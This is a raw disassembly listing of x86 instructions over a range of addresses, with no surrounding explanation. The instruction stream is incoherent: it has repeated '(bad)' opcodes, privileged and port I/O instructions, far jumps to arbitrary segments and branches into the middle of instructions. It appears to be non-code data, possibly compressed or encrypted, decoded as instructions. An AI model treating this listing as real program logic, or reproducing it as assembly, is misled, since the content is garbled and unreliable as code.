  421d24:	jo     0x421d9e
  421d26:	aam    0xa1
  421d28:	dec    esp
  421d29:	out    0xd8,eax
  421d2b:	sub    DWORD PTR [ecx],ebp
  421d2d:	nop
  421d2e:	sub    eax,0x4bf76040
  421d33:	rol    BYTE PTR [ecx-0x1a],1
  421d36:	or     al,0x1a
  421d38:	ret    
  421d39:	jnp    0x421d64
  421d3b:	dec    edi
  421d3c:	(bad)  
  421d3e:	fmul   st,st(4)
  421d40:	xchg   esi,eax
  421d41:	pop    edi
  421d42:	cli    
  421d43:	and    ecx,ecx
  421d45:	shl    DWORD PTR [ecx+0x73c7e23c],cl
  421d4b:	aam    0x66
  421d4d:	test   eax,0xfd368ba2
  421d52:	add    bh,BYTE PTR [ecx-0x2f3ece91]
  421d58:	add    cl,BYTE PTR [edi]
  421d5a:	adc    DWORD PTR [ebx+edx*8-0x25],ebx
  421d5e:	push   ds
  421d5f:	inc    esp
  421d60:	out    dx,al
  421d61:	(bad)  
  421d62:	fbstp  TBYTE PTR [eax-0x77]
  421d65:	push   edx
  421d66:	pusha  
  421d67:	pop    ss
  421d68:	mov    ds:0x6d4a7467,al
  421d6d:	rol    BYTE PTR [edx],1
  421d6f:	jo     0x421ded
  421d71:	jge    0x421ddf
  421d73:	mov    edx,0x388423bc
  421d78:	push   esi
  421d79:	mov    DWORD PTR [edx],ebx
  421d7b:	lds    esi,FWORD PTR [ebx-0x6b]
  421d7e:	hlt    
  421d7f:	cli    
  421d80:	push   0xffffff8e
  421d82:	outs   dx,DWORD PTR ds:[esi]
  421d83:	mov    bh,BYTE PTR [ebp+0x19]
  421d86:	setne  BYTE PTR fs:[edi-0x7a]
  421d8b:	and    BYTE PTR ds:0x84fbd196,cl
  421d91:	or     ebp,ebp
  421d93:	cmp    eax,0xd701b9cc
  421d98:	cli    
  421d99:	or     ecx,DWORD PTR [ecx+0x43]
  421d9c:	test   DWORD PTR [ecx],edx
  421d9e:	scas   eax,DWORD PTR es:[edi]
  421d9f:	xchg   edx,ebx
  421da1:	mov    BYTE PTR [ebx-0x6e],ch
  421da4:	push   edi
  421da5:	in     al,0x28
  421da7:	push   es
  421da8:	push   0x10
  421daa:	push   ecx
  421dab:	mov    al,ds:0xec85e53e
  421db0:	lock pop eax
  421db2:	add    eax,0xca0b00d9
  421db7:	jns    0x421df9
  421db9:	fnstenv [eax]
  421dbb:	jg     0x421d5f
  421dbd:	sub    DWORD PTR [edi],0x36
  421dc0:	dec    ecx
  421dc1:	les    edx,FWORD PTR ds:0xde268c18
  421dc7:	jbe    0x421d53
  421dc9:	stc    
  421dca:	dec    esi
  421dcb:	xchg   ecx,eax
  421dcc:	push   esi
  421dcd:	mov    dh,0x97
  421dcf:	adc    DWORD PTR [ebp+0x23],edx
  421dd2:	popf   
  421dd3:	add    BYTE PTR ds:0xb648d138,ch
  421dd9:	push   eax
  421dda:	sahf   
  421ddb:	adc    cl,BYTE PTR [eax+ecx*2]
  421dde:	popf   
  421ddf:	add    BYTE PTR [eax-0x73],0x81
  421de3:	xchg   edx,eax
  421de4:	in     eax,dx
  421de5:	icebp  
  421de6:	aaa    
  421de7:	mov    ecx,0xd85069d7
  421dec:	mul    esp
  421dee:	das    
  421def:	aas    
  421df0:	out    0x9,al
  421df2:	pop    eax
  421df3:	cwde   
  421df4:	dec    esi
  421df5:	int    0x6d
  421df7:	stos   BYTE PTR es:[edi],al
  421df8:	ss retf 
  421dfa:	(bad)  
  421dfb:	clc    
  421dfc:	popa   
  421dfd:	push   ecx
  421dfe:	add    esp,ecx
  421e00:	sub    al,0xff
  421e02:	or     al,0x64
  421e04:	sub    BYTE PTR [esi+0x13],cl
  421e07:	outs   dx,BYTE PTR ds:[esi]
  421e08:	clc    
  421e09:	add    dl,ch
  421e0b:	call   0x9:0x69fe8253
	...
  421e72:	add    BYTE PTR [eax],al
  421e74:	iret   
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	lock mov bh,0xa8
  421e83:	add    al,0xc5
  421e85:	imul   eax,DWORD PTR [ecx],0x10500
  421e8b:	add    BYTE PTR [edi+0x1d871655],bl
  421e91:	fidivr DWORD PTR [edx+0x2b589f14]
  421e97:	dec    esp
  421e98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e99:	xor    eax,0x35e60ab5
  421e9e:	adc    DWORD PTR [edi-0xf091b6a],esp
  421ea4:	adc    DWORD PTR [ebx+0x3920dec5],ebx
  421eaa:	jne    0x421e2d
  421eac:	pop    ds
  421ead:	and    edi,DWORD PTR [ebp-0x70ea9fa]
  421eb3:	add    eax,0xbe7d99b3
  421eb8:	test   al,0x90
  421eba:	jne    0x421f39
  421ebc:	bound  ebx,QWORD PTR [esi-0x63bc88a5]
  421ec2:	and    dl,BYTE PTR [esi]
  421ec4:	clc    
  421ec5:	push   edi
  421ec6:	adc    esi,DWORD PTR [eax+0x9777d40]
  421ecc:	rol    BYTE PTR [esi],1
  421ece:	mov    edi,DWORD PTR [edi+eax*8+0xa]
  421ed2:	jne    0x421ea1
  421ed4:	sbb    eax,0xb4eb5ddd
  421ed9:	mov    edx,0xd7cd7072
  421ede:	sub    BYTE PTR [eax+0x5af40087],ch
  421ee4:	push   0xffffff9a
  421ee6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ee7:	mov    eax,ds:0x4222eea3
  421eec:	inc    ebx
  421eed:	sub    DWORD PTR [ecx],0x61
  421ef0:	mov    edi,ecx
  421ef2:	arpl   WORD PTR [edi-0x63],bx
  421ef5:	dec    DWORD PTR [eax-0x2e9cddd5]
  421efb:	in     eax,0x56
  421efd:	xchg   ah,ah
  421eff:	jg     0x421f57
  421f01:	push   ecx
  421f02:	add    edx,DWORD PTR [ecx]
  421f04:	adc    BYTE PTR [ebx+edx*1],dl
  421f07:	cs xchg ebp,eax
  421f0a:	loopne 0x421ec8
  421f0c:	call   0x2bfb17ca
  421f11:	fs pop esi
  421f13:	into   
  421f14:	jmp    0x421f4c
  421f16:	rcr    BYTE PTR [esi+0x21],1
  421f19:	and    BYTE PTR [ebp-0x1c],dh
  421f1c:	cwde   
  421f1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f1e:	inc    ebp
  421f1f:	jns    0x421ecd
  421f21:	lds    eax,FWORD PTR [eax-0x22]
  421f24:	ror    BYTE PTR [eax-0x4d65a8e],cl
  421f2a:	sbb    dl,BYTE PTR [edi+0x14]
  421f2d:	push   ebx
  421f2e:	jmp    0x62fd:0x44f37f85
  421f35:	mov    ebx,DWORD PTR [ebp+0x2898aa5b]
  421f3b:	das    
  421f3c:	shr    BYTE PTR ds:0xaff1bf8a,cl
  421f42:	das    
  421f43:	arpl   cx,sp
  421f45:	xor    esi,DWORD PTR [eax-0x6295b72b]
  421f4b:	test   al,0x5d
  421f4d:	sar    BYTE PTR [ebx-0x775462d5],1
  421f53:	pop    esp
  421f54:	pop    esp
  421f55:	sbb    al,0xd4
  421f57:	sub    bl,BYTE PTR [eax+0x75517bf8]
  421f5d:	das    
  421f5e:	mov    al,0x27
  421f60:	mov    dh,0xa5
  421f62:	aas    
  421f63:	jbe    0x421fd1
  421f65:	jecxz  0x421f86
  421f67:	imul   ebp,DWORD PTR [eax+0x4f272fd],0xda82bcca
  421f71:	add    eax,0x228f3bf7
  421f76:	lahf   
  421f77:	aaa    
  421f78:	xor    al,0x5e
  421f7a:	or     esp,eax
  421f7c:	bound  ebp,QWORD PTR [ebp-0x2d]
  421f7f:	test   eax,0x71497623
  421f84:	repnz fisub DWORD PTR [edx+0x60]
  421f88:	std    
  421f89:	stc    
  421f8a:	pop    edi
  421f8b:	mov    dh,0x23
  421f8d:	fisub  DWORD PTR ds:0xf937
	...
  421ff3:	add    BYTE PTR [ebx+0x6],ch
  421ff6:	(bad)  
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	data16 adc dl,dh
  422002:	inc    ecx
  422003:	inc    edi
  422004:	retf   0x16a
  422007:	add    BYTE PTR ds:0x63000001,al
  42200d:	push   es
  42200e:	sbb    DWORD PTR [esi],0xffffff86
  422011:	fidiv  WORD PTR [ebx-0x21ab3d8]
  422017:	jecxz  0x42207b
  422019:	shl    BYTE PTR [ebp*2+0x3704c1e7],1
  422020:	fisubr DWORD PTR [eax+0xf]
  422023:	int3   
  422024:	sahf   
  422025:	aad    0x93
  422027:	pop    esp
  422028:	push   ss
  422029:	inc    ecx
  42202a:	dec    eax
  42202b:	mov    ah,0x7f
  42202d:	lods   al,BYTE PTR ds:[esi]
  42202e:	shl    WORD PTR [ebp+ebp*4-0x4],1
  422033:	in     al,0x38
  422035:	mov    ch,0xac
  422037:	mov    ecx,0xac46d8a6
  42203c:	and    DWORD PTR [eax+0x4d],eax
  42203f:	push   DWORD PTR [ecx+esi*8-0x7b]
  422043:	jno    0x42204f
  422045:	sbb    bh,dh
  422047:	pop    ebx
  422048:	fwait
  422049:	jns    0x422043
  42204b:	stos   DWORD PTR es:[edi],eax
  42204c:	mov    bh,0xa
  42204e:	cdq    
  42204f:	enter  0x16e7,0x68
  422053:	mov    ecx,0xe02e25e6
  422058:	les    eax,FWORD PTR [ebp-0x54]
  42205b:	loop   0x4220b7
  42205d:	cmp    edi,DWORD PTR [ecx]
  42205f:	arpl   WORD PTR [ebx+0x12],di
  422062:	out    0x91,eax
  422064:	xchg   ecx,eax
  422065:	cdq    
  422066:	push   ebp
  422067:	jg     0x422056
  422069:	xchg   ebx,eax
  42206a:	jns    0x421ff3
  42206c:	call   0x8f3f:0xc882d2a8
  422073:	cmp    eax,0xc6c16096
  422078:	call   0x1f5e:0xa725100c
  42207f:	outs   dx,BYTE PTR ds:[esi]
  422080:	push   esi
  422081:	loope  0x422045
  422083:	cmp    edi,edx
  422085:	pop    es
  422086:	inc    eax
  422087:	sti    
  422088:	or     edi,DWORD PTR [edx+0x1fdd230c]
  42208e:	fsincos 
  422090:	addr16 cmp eax,0xa6111f1
  422096:	jmp    0x4220b2
  422098:	mov    esi,edx
  42209a:	mov    ecx,0x1ebb4c08
  42209f:	inc    esi
  4220a0:	jns    0x42211b
  4220a2:	out    dx,eax
  4220a3:	push   edx
  4220a4:	inc    edi
  4220a5:	aas    
  4220a6:	test   al,0x20
  4220a8:	(bad)  
  4220a9:	test   al,0x5b
  4220ab:	fild   WORD PTR [edx+0x30]
  4220ae:	rcl    DWORD PTR [ebx-0xc2d6a3c],1
  4220b4:	popf   
  4220b5:	pop    ss
  4220b6:	cmovno edi,ebx
  4220b9:	inc    eax
  4220ba:	mov    ecx,0x16d584b8
  4220bf:	imul   ebp,ecx,0xffffff81
  4220c2:	std    
  4220c3:	stos   BYTE PTR es:[edi],al
  4220c4:	std    
  4220c5:	ins    BYTE PTR es:[edi],dx
  4220c6:	aaa    
  4220c7:	sbb    al,BYTE PTR ds:0xe51dadf4
  4220cd:	shl    BYTE PTR [ebp-0x7],0x60
  4220d1:	push   esp
  4220d2:	xlat   BYTE PTR ds:[ebx]
  4220d3:	adc    ecx,DWORD PTR [esi+0x20]
  4220d6:	jb     0x4220fa
  4220d8:	inc    esp
  4220d9:	xchg   edi,eax
  4220da:	or     BYTE PTR [esp+esi*4+0x12],cl
  4220de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220df:	mov    al,0x48
  4220e1:	and    eax,0xa79e10e2
  4220e6:	sub    dl,BYTE PTR [eax+0x33]
  4220e9:	lds    edx,FWORD PTR [ebx]
  4220eb:	fist   WORD PTR [edi+0x1a4828a5]
  4220f1:	pop    edx
  4220f2:	jmp    0x4220b9
  4220f4:	and    al,0x42
  4220f6:	cli    
  4220f7:	dec    ebx
  4220f8:	ret    0xc98b
  4220fb:	inc    esi
  4220fc:	or     eax,0xf61383df
  422101:	test   DWORD PTR [edi-0x26],edi
  422104:	and    DWORD PTR [ecx-0x6d],ebx
  422107:	mov    al,ds:0xce08a5e2
  42210c:	pop    eax
  42210d:	and    eax,0x10f64d
	...
  422172:	add    BYTE PTR [eax],al
  422174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422175:	push   edx
  422176:	jnp    0x422175
  422178:	(bad)  
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    ebp,DWORD PTR [edi-0x30d80e1c]
  422185:	imul   eax,DWORD PTR [ecx],0x0
  422188:	add    eax,0xb0000001
  42218d:	or     ebp,esi
  42218f:	pop    ebp
  422190:	or     eax,0x9f9bc339
  422195:	outs   dx,BYTE PTR ds:[esi]
  422196:	(bad)  
  422197:	xchg   edx,eax
  422198:	out    dx,eax
  422199:	mov    BYTE PTR [eax-0x6d],dl
  42219c:	sahf   
  42219d:	jp     0x4221aa
  42219f:	std    
  4221a0:	test   BYTE PTR [ecx-0x7b],bl
  4221a3:	in     eax,0xac
  4221a5:	fnstsw WORD PTR [eax+0x1e19110d]
  4221ab:	test   al,0xd3
  4221ad:	xchg   DWORD PTR [ebp-0xc14870d],edx
  4221b3:	inc    edx
  4221b4:	xchg   ebx,eax
  4221b5:	xchg   esi,eax
  4221b6:	sub    eax,0xe1675b20
  4221bb:	out    0x85,al
  4221bd:	sub    edx,DWORD PTR [ebx+0x21]
  4221c0:	shl    DWORD PTR [eax+ebx*8],1
  4221c3:	dec    ebp
  4221c4:	punpcklwd mm0,mm0
  4221c7:	cmp    BYTE PTR [ecx],cl
  4221c9:	gs and al,0x30
  4221cc:	inc    ecx
  4221cd:	lahf   
  4221ce:	jb     0x4221e7
  4221d0:	lahf   
  4221d1:	and    eax,0xf6f0f792
  4221d6:	call   0x69413dfd
  4221db:	imul   BYTE PTR [ebx+0x7fa1c123]
  4221e1:	cwde   
  4221e2:	fwait
  4221e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221e4:	xor    al,BYTE PTR [ecx-0x15]
  4221e7:	mov    esi,0xaae66e81
  4221ec:	aad    0xd8
  4221ee:	sbb    cl,BYTE PTR [edx]
  4221f0:	fstp   DWORD PTR [edx-0x51]
  4221f3:	ins    DWORD PTR es:[edi],dx
  4221f4:	dec    eax
  4221f5:	add    al,0x16
  4221f7:	xchg   ebp,eax
  4221f8:	xchg   ebp,eax
  4221f9:	mov    eax,ds:0x92a011ab
  4221fe:	cmp    esp,esp
  422200:	push   eax
  422201:	mov    al,ds:0x795b6b9b
  422206:	inc    ebp
  422207:	push   eax
  422208:	ins    BYTE PTR es:[edi],dx
  422209:	inc    edx
  42220a:	in     eax,0x68
  42220c:	loopne 0x4221c7
  42220e:	xchg   esp,eax
  42220f:	add    eax,0x94f86e69
  422214:	repz sti 
  422216:	shl    DWORD PTR [edi],0x7d
  422219:	out    dx,eax
  42221a:	mov    bl,0x43
  42221c:	les    edx,FWORD PTR [ebp-0xa]
  42221f:	pop    ebx
  422220:	or     bl,BYTE PTR [ebp-0x20fa1141]
  422226:	xchg   ecx,eax
  422227:	leave  
  422228:	mov    WORD PTR [ecx],ss
  42222a:	jne    0x42226e
  42222c:	jl     0x4221e1
  42222e:	das    
  42222f:	push   edx
  422230:	into   
  422231:	imul   edx,esp,0x16142626
  422237:	xor    eax,0xa1d56a91
  42223c:	or     DWORD PTR [esi-0x7a6f0a17],ecx
  422242:	jno    0x42222f
  422244:	loopne 0x42223f
  422246:	mov    ds:0x2fa989ec,eax
  42224b:	loop   0x422282
  42224d:	xor    eax,0xc8795460
  422252:	ret    
  422253:	cmovo  esi,DWORD PTR [esi+0x4f]
  422257:	lods   eax,DWORD PTR ds:[esi]
  422258:	in     al,0x34
  42225a:	mov    al,ds:0x676d8b7c
  42225f:	jmp    0x46f3:0xe30d4554
  422266:	jo     0x4222cc
  422268:	shr    BYTE PTR [ebx+0x2f],0x2
  42226c:	xchg   esi,eax
  42226d:	sti    
  42226e:	or     dh,cl
  422270:	cmp    DWORD PTR [esp+edx*4-0x1c],edi
  422274:	or     al,0x73
  422276:	pop    es
  422277:	daa    
  422278:	fxch   st(4)
  42227a:	std    
  42227b:	je     0x4222b3
  42227d:	mov    ds:0xcaa381aa,eax
  422282:	inc    edx
  422283:	and    DWORD PTR [ebx+eiz*1+0x68],esp
  422287:	ins    DWORD PTR es:[edi],dx
  422288:	fs mov al,dl
  42228b:	je     0x422239
  42228d:	mov    edi,0x98021d
	...
  4222f2:	add    BYTE PTR [eax],al
  4222f4:	(bad)  
  4222f5:	in     eax,dx
  4222f6:	lods   eax,DWORD PTR ds:[esi]
  4222f7:	imul   edi
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	fidivr WORD PTR [edi+0x6cd47f30]
  422306:	add    DWORD PTR [eax],eax
  422308:	add    eax,0xcc000001
  42230d:	(bad)  
  42230e:	call   0x8ee8:0xc710ef27
  422315:	add    eax,0xe0f002a2
  42231a:	sti    
  42231b:	push   cs
  42231c:	jbe    0x4222d6
  42231e:	jle    0x4222b2
  422320:	mov    ah,BYTE PTR [ecx+0x3b]
  422323:	jmp    0xc403:0xb6034419
  42232a:	sbb    BYTE PTR [bx+si-0x19],al
  42232e:	inc    edi
  42232f:	jp     0x4222c8
  422331:	cmp    edi,eax
  422333:	pop    ebp
  422334:	into   
  422335:	sahf   
  422336:	sbb    DWORD PTR [esi-0x55],ebp
  422339:	icebp  
  42233a:	out    dx,al
  42233b:	adc    DWORD PTR [ebx+0x4c],edi
  42233e:	push   0xffffff8d
  422340:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422341:	sub    esp,DWORD PTR [esi+edi*2]
  422344:	pop    DWORD PTR [esi+0x8250ed2]
  42234a:	push   esi
  42234b:	nop
  42234c:	neg    DWORD PTR [esi]
  42234e:	sub    DWORD PTR [edi+edx*1],ebx
  422351:	dec    eax
  422352:	not    BYTE PTR [ebx+0x239190d8]
  422358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422359:	dec    ebx
  42235a:	sbb    eax,DWORD PTR [ebx-0x76921a22]
  422360:	loope  0x422317
  422362:	xchg   esi,eax
  422363:	(bad)  
  422364:	adc    ch,ah
  422366:	ins    DWORD PTR es:[edi],dx
  422367:	test   eax,0x8e3d5d8c
  42236c:	jmp    0x422385
  42236e:	jb     0x42235b
  422370:	jecxz  0x422321
  422372:	sahf   
  422373:	mov    esp,fs
  422375:	mov    eax,ds:0x8db0151c
  42237a:	jns    0x4223a6
  42237c:	fistp  WORD PTR [ecx-0x3a]
  42237f:	push   ds
  422380:	xlat   BYTE PTR ds:[ebx]
  422381:	pop    ebp
  422382:	xlat   BYTE PTR ds:[ebx]
  422383:	or     edi,ebp
  422385:	mov    cl,0x47
  422387:	das    
  422388:	mov    al,0x39
  42238a:	pop    ds
  42238b:	mov    al,0x1
  42238d:	add    ah,dh
  42238f:	lock jle 0x4223b0
  422392:	xor    BYTE PTR [ebx+eiz*4],dl
  422395:	fs mov al,0x52
  422398:	int3   
  422399:	mov    fs,WORD PTR [ebp-0x25d29138]
  42239f:	add    dh,BYTE PTR [ebp+0x2e]
  4223a2:	in     eax,dx
  4223a3:	aad    0x7d
  4223a5:	xchg   esp,eax
  4223a6:	and    ebx,DWORD PTR [edi]
  4223a8:	jne    0x4223e6
  4223aa:	je     0x42237c
  4223ac:	mov    eax,ds:0xa834628e
  4223b1:	ret    0x3daa
  4223b4:	jge    0x422374
  4223b6:	mov    esp,0x2fe3ee63
  4223bb:	dec    edx
  4223bc:	and    al,0xec
  4223be:	jmp    0xaed0:0xd03e347d
  4223c5:	sub    DWORD PTR [edx+0x3b],ecx
  4223c8:	sbb    DWORD PTR [edx],esp
  4223ca:	outs   dx,BYTE PTR ds:[esi]
  4223cb:	xchg   DWORD PTR [eax-0x23],ebx
  4223ce:	cmp    edi,ebp
  4223d0:	and    dh,dh
  4223d2:	pop    ecx
  4223d3:	and    edi,ecx
  4223d5:	fs (bad) 
  4223d7:	popa   
  4223d8:	mov    edi,0xd8ddcbad
  4223dd:	push   ebp
  4223de:	out    0x70,eax
  4223e0:	in     eax,dx
  4223e1:	call   DWORD PTR [edx-0x6baa4e0d]
  4223e7:	mov    edi,0x170a0df7
  4223ec:	imul   ebx,DWORD PTR [ecx+0x75d6b6fd],0xffffffaf
  4223f3:	rcl    dh,cl
  4223f5:	lods   eax,DWORD PTR ds:[esi]
  4223f6:	test   eax,0x3ec64aa2
  4223fb:	push   0xffffff8f
  4223fd:	jno    0x422406
  4223ff:	mov    bh,0x42
  422401:	outs   dx,DWORD PTR ds:[esi]
  422402:	add    eax,0x2c3836d4
  422407:	mov    bl,0xf4
  422409:	test   DWORD PTR ss:[edi-0x73],0xeb500c3d
	...
  422471:	add    BYTE PTR [eax],al
  422473:	add    BYTE PTR [edx-0x7e],dl
  422476:	cs imul edi,esi,0xbbbb57ed
  42247d:	xor    ebp,esp
  42247f:	cdq    
  422480:	add    BYTE PTR [edi],0xa
  422483:	or     cl,bl
  422485:	ins    DWORD PTR es:[edi],dx
  422486:	add    DWORD PTR [eax],eax
  422488:	add    eax,0x56000001
  42248d:	rcl    BYTE PTR [edx],0x93
  422490:	and    BYTE PTR [esp+ebx*2+0x5b5f50b4],dh
  422497:	test   BYTE PTR [edi],0xe0
  42249a:	and    eax,0xd28994d
  42249f:	sbb    BYTE PTR ds:0x3abe0a77,ah
  4224a5:	sub    BYTE PTR [esp+ebx*8+0x53ab9d5e],ch
  4224ac:	pop    es
  4224ad:	cdq    
  4224ae:	inc    eax
  4224af:	pushf  
  4224b0:	je     0x42245c
  4224b2:	mov    dl,0x7d
  4224b4:	ffree  st(2)
  4224b6:	setle  BYTE PTR [edi+0x3f98292f]
  4224bd:	cmc    
  4224be:	xor    bh,dl
  4224c0:	push   es
  4224c1:	inc    ecx
  4224c2:	xchg   esi,eax
  4224c3:	call   0x6f387669
  4224c8:	mov    ah,BYTE PTR [ebp-0x66]
  4224cb:	pop    ebx
  4224cc:	loope  0x4224f5
  4224ce:	mov    edi,0x91bd3a0d
  4224d3:	jmp    0x5612:0x26d4de82
  4224da:	fwait
  4224db:	adc    al,0xe1
  4224dd:	mov    esi,0x78539236
  4224e2:	out    dx,al
  4224e3:	xchg   esi,eax
  4224e4:	add    eax,0xcf3e3903
  4224e9:	loop   0x4224bb
  4224eb:	iret   
  4224ec:	das    
  4224ed:	push   cs
  4224ee:	loop   0x4224c7
  4224f0:	push   esi
  4224f1:	cmp    DWORD PTR [edx],edx
  4224f3:	push   0xc1fa43d
  4224f8:	iret   
  4224f9:	jo     0x422565
  4224fb:	push   edx
  4224fc:	test   al,0xc5
  4224fe:	push   0x3e
  422500:	add    eax,0x68e57c2f
  422505:	mov    al,0x9c
  422507:	xor    ebx,DWORD PTR [eax-0x9]
  42250a:	(bad)
  42250d:	cmp    al,0x52
  42250f:	push   ecx
  422510:	pop    eax
  422511:	mov    ah,0x64
  422513:	sbb    al,0x0
  422515:	test   eax,0xd3b1e5a5
  42251a:	repz cmc 
  42251c:	xchg   edx,eax
  42251d:	and    eax,0x72cc1657
  422522:	cmp    al,0x4d
  422524:	mov    edx,0x3c9f0d05
  422529:	setg   BYTE PTR [eax]
  42252c:	cli    
  42252d:	cmc    
  42252e:	ret    0xa147
  422531:	(bad)
  422535:	pushf  
  422536:	pop    es
  422537:	retf   0xa9f3
  42253a:	xor    BYTE PTR es:[edx-0x35191ddd],bh
  422541:	out    0xdc,al
  422543:	mov    edx,0xc2616cc0
  422548:	lds    ebp,FWORD PTR [edi+0x79b9ae57]
  42254e:	and    eax,0x9127b063
  422553:	sti    
  422554:	mov    ds:0x70d4659,eax
  422559:	mov    ebx,DWORD PTR [edi]
  42255b:	scas   eax,DWORD PTR es:[edi]
  42255c:	rcl    DWORD PTR [eax],1
  42255e:	xchg   edx,eax
  42255f:	mov    ch,0x32
  422561:	lods   al,BYTE PTR ds:[esi]
  422562:	rol    ebp,1
  422564:	test   BYTE PTR [ebx-0x77],ah
  422567:	add    al,0xe4
  422569:	xchg   edx,eax
  42256a:	jmp    0x422502
  42256c:	and    dh,ch
  42256e:	push   ecx
  42256f:	es aaa 
  422571:	fcmovu st,st(4)
  422573:	(bad)  
  422574:	in     al,0x69
  422576:	mov    edx,0xd5196fe3
  42257b:	int    0xd4
  42257d:	and    ch,BYTE PTR [edx]
  42257f:	push   es
  422580:	jl     0x42251b
  422582:	jne    0x422563
  422584:	fucomi st,st(7)
  422586:	ror    DWORD PTR [esi+0x68003fc4],cl
  42258c:	cmp    DWORD PTR [esi+0xe4bb64],0x0
	...
  4225f2:	add    BYTE PTR [eax],al
  4225f4:	call   0xfa77:0xbf778fae
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx+0x92fa2f8]
  422602:	jb     0x422590
  422604:	fisubr WORD PTR [esi+0x1]
  422607:	add    BYTE PTR ds:0x5f000001,al
  42260d:	call   0x6a4:0xd4668b23
  422614:	mov    ebp,0x7ad9177f
  422619:	ja     0x4225ea
  42261b:	add    dh,BYTE PTR [ebp-0x21cf0546]
  422621:	popf   
  422622:	and    eax,0x66e56b97
  422627:	sub    DWORD PTR [ebx+0xf50ad16],0x62
  42262e:	aaa    
  42262f:	sbb    DWORD PTR [edx-0x74788cb3],0x7a
  422636:	xlat   BYTE PTR ds:[ebx]
  422637:	dec    edx
  422638:	inc    ebx
  422639:	adc    ebp,DWORD PTR [ebx+0x56]
  42263c:	adc    eax,DWORD PTR [edi]
  42263e:	sub    al,0x71
  422640:	sti    
  422641:	push   0x38b6a643
  422646:	xchg   edx,eax
  422647:	(bad)  
  422648:	adc    eax,0x7479f133
  42264d:	mov    ch,BYTE PTR [edi-0x36]
  422650:	jb     0x422694
  422652:	jle    0x4226b7
  422654:	(bad)  
  422655:	sbb    edx,eax
  422657:	xchg   ecx,eax
  422658:	push   eax
  422659:	(bad)  
  42265a:	mov    ebx,0xa4984d8f
  42265f:	mov    BYTE PTR [edx-0x4c48bf57],bh
  422665:	retf   0x33a3
  422668:	mov    ah,0xfc
  42266a:	addr16 sahf 
  42266c:	jge    0x4226b6
  42266e:	ror    al,cl
  422670:	out    dx,eax
  422671:	hlt    
  422672:	retf   0x1235
  422675:	mov    dl,BYTE PTR [edx+0x26]
  422678:	lahf   
  422679:	push   edi
  42267a:	sbb    BYTE PTR [ecx+0x37584145],cl
  422680:	xchg   ebx,eax
  422681:	je     0x422650
  422683:	and    al,0x88
  422685:	cmp    BYTE PTR [ebx+0x7c],dh
  422688:	je     0x4226bc
  42268a:	inc    ebx
  42268b:	fdiv   st(7),st
  42268d:	loope  0x42261e
  42268f:	dec    edx
  422690:	sbb    ebp,DWORD PTR [esi-0x3efb70d]
  422696:	btr    DWORD PTR [ebx-0x78],edx
  42269a:	dec    esi
  42269b:	xchg   BYTE PTR [eax-0x7c],cl
  42269e:	fwait
  42269f:	cld    
  4226a0:	inc    esp
  4226a1:	and    DWORD PTR [eax],edx
  4226a3:	clc    
  4226a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226a5:	jbe    0x42269d
  4226a7:	push   ebp
  4226a8:	jnp    0x422694
  4226aa:	push   esp
  4226ab:	mov    BYTE PTR [esi],bh
  4226ad:	inc    ecx
  4226ae:	mov    ebx,0x40983eab
  4226b3:	xor    eax,DWORD PTR [edx*2-0x3f08d820]
  4226ba:	and    bl,BYTE PTR [ebx+0x73]
  4226bd:	imul   edx,edx,0x2c
  4226c0:	(bad)  
  4226c1:	lds    eax,FWORD PTR [edx+0x4]
  4226c4:	push   ecx
  4226c5:	jns    0x422656
  4226c7:	test   DWORD PTR [edx+0x30e705de],ebx
  4226cd:	add    al,0x10
  4226cf:	inc    esi
  4226d0:	data16 jb 0x422696
  4226d3:	dec    ecx
  4226d4:	xchg   edi,edi
  4226d6:	mov    dh,0x73
  4226d8:	jb     0x4226ae
  4226da:	(bad)  
  4226db:	mov    ah,0xa0
  4226dd:	mov    ebx,0x29b1446a
  4226e2:	pop    esi
  4226e3:	in     eax,dx
  4226e4:	adc    DWORD PTR [ecx+0x44e1c34a],esi
  4226ea:	je     0x4226ec
  4226ec:	inc    esi
  4226ed:	pop    edx
  4226ee:	test   DWORD PTR [ecx],eax
  4226f0:	cmc    
  4226f1:	jno    0x4226b7
  4226f3:	adc    eax,edi
  4226f5:	scas   eax,DWORD PTR es:[edi]
  4226f6:	(bad)  
  4226f7:	out    0x55,al
  4226f9:	cmp    al,0x77
  4226fb:	mov    al,0x62
  4226fd:	xchg   ebp,eax
  4226fe:	mov    DWORD PTR [ecx],ecx
  422700:	mov    eax,DWORD PTR [ecx+0x29]
  422703:	shl    BYTE PTR [esi+esi*2+0x53b542cc],cl
  42270a:	stos   BYTE PTR es:[edi],al
  42270b:	or     BYTE PTR [eax+0x57733466],0x0
	...
  422772:	add    BYTE PTR [eax],al
  422774:	daa    
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0xa87f01c8
  422781:	jp     0x422794
  422783:	int    0xe3
  422785:	outs   dx,DWORD PTR ds:[esi]
  422786:	add    DWORD PTR [eax],eax
  422788:	add    eax,0x5b000001
  42278d:	dec    edi
  42278e:	or     al,cl
  422790:	mov    ebp,edi
  422792:	xchg   ebx,eax
  422793:	jns    0x422743
  422795:	xor    al,0xfc
  422797:	div    DWORD PTR [ecx-0x3e]
  42279a:	pushf  
  42279b:	scas   eax,DWORD PTR es:[edi]
  42279c:	xchg   cl,bh
